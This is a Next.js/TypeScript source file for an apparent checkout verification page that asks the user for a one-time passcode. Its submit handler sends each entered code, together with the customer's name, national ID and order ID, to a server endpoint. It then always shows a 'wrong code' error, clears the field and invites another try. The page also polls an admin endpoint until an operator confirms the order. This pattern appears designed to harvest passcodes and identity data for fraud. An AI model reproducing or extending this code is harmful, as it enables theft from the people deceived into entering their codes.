"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import { useCartStore } from "../../store/cartStore";
import PageBackground from "../components/PageBackground";
import VerifyHeroHeader from "./components/VerifyHeroHeader";
import OtpCard from "./components/OtpCard";
import ConfirmedPopup from "./components/ConfirmedPopup";

export default function VerifyPage() {
  const [otp, setOtp] = useState("");
  const inputRef = useRef<HTMLInputElement | null>(null);
  const [codeError, setCodeError] = useState(false);
  const [lengthError, setLengthError] = useState(false);
  const [resent, setResent] = useState(false);
  const [cooldown, setCooldown] = useState(0);
  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [submitCooldown, setSubmitCooldown] = useState(0);
  const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [confirmed, setConfirmed] = useState(false);
  const [dbOrderId, setDbOrderId] = useState<string | null>(
    typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null
  );
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const { customer } = useCartStore();
  const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";
  const customerName = typeof window !== "undefined" ? localStorage.getItem("customerName") ?? customer?.name ?? "—" : "—";

  const startCooldown = useCallback(() => {
    localStorage.setItem("resendUnlockAt", String(Date.now() + 60000));
    setCooldown(60);
    clearInterval(cooldownRef.current!);
    cooldownRef.current = setInterval(() => {
      setCooldown((prev) => {
        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  }, []);

  useEffect(() => {
    const currentTime = Date.now();
    let unlockAt = Number(localStorage.getItem("resendUnlockAt") ?? 0);
    if (unlockAt <= currentTime) {
      unlockAt = currentTime + 60000;
      localStorage.setItem("resendUnlockAt", String(unlockAt));
    }
    const remaining = Math.ceil((unlockAt - currentTime) / 1000);
    if (remaining <= 0) return;
    const timeoutId = setTimeout(() => {
      setCooldown(remaining);
      cooldownRef.current = setInterval(() => {
        setCooldown((prev) => {
          if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
          return prev - 1;
        });
      }, 1000);
    }, 0);
    return () => { clearTimeout(timeoutId); if (cooldownRef.current) clearInterval(cooldownRef.current); };
  }, []);

  useEffect(() => {
    const id = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);
    if (!id) return;
    if (!dbOrderId) setDbOrderId(id);
    pollRef.current = setInterval(async () => {
      const res = await fetch(`/api/admin/orders/${id}`);
      if (!res.ok) return;
      const data = await res.json();
      if (data.status === "confirmed") { clearInterval(pollRef.current!); setConfirmed(true); }
    }, 5000);
    return () => clearInterval(pollRef.current!);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => { inputRef.current?.focus(); }, []);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const code = otp.trim();
    if (code.length !== 4 && code.length !== 6) { setLengthError(true); return; }
    await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
    });
    setCodeError(true);
    setOtp("");
    inputRef.current?.focus();
    setSubmitCooldown(5);
    clearInterval(submitCooldownRef.current!);
    submitCooldownRef.current = setInterval(() => {
      setSubmitCooldown((prev) => {
        if (prev <= 1) { clearInterval(submitCooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  }

  const confirmedId = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);
  if (confirmed && confirmedId) return <ConfirmedPopup confirmedId={confirmedId} />;

  return (
    <main className="min-h-screen" dir="rtl">
      <PageBackground dotId="vfdots" gridId="vfgrid" />
      <VerifyHeroHeader />

      <div className="max-w-2xl mx-auto px-4 sm:px-8 -mt-6 pb-16">
        <OtpCard
          otp={otp}
          setOtp={setOtp}
          inputRef={inputRef}
          codeError={codeError}
          setCodeError={setCodeError}
          lengthError={lengthError}
          setLengthError={setLengthError}
          resent={resent}
          cooldown={cooldown}
          submitCooldown={submitCooldown}
          onSubmit={handleSubmit}
          onResend={() => {
            if (cooldown > 0) return;
            fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName }) });
            setResent(true);
            setTimeout(() => setResent(false), 3000);
            startCooldown();
          }}
        />
      </div>
    </main>
  );
}
